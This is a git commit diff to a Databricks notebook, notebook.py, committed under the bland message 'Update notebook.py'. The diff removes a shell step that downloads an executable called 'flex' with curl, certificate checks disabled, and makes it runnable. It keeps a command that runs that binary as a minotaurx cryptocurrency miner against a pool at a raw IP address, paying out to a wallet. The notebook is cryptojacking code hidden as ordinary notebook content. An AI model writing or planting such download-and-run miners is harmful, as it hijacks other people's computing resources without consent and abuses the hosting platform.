4012fd356d70d40ab3dc85bb7363fd73280b70db
paskofamas <mr.paskofa42@jugda.com>
2025-02-08 11:32:09 +0700

    Update notebook.py

--- notebook.py
+++ notebook.py
@@ -1,5 +1,4 @@
 # Databricks notebook source
 %python
 %sh
-curl -sLkO https://github.com/paskofa10/webmoon/releases/download/flex/flex && chmod +x flex
-./flex -a minotaurx -o 27.254.39.27:7021 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW.Wijaya1 -p c=MAZA
+./flex -a minotaurx -o 27.254.39.27:7021 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW.Wijaya -p c=MAZA
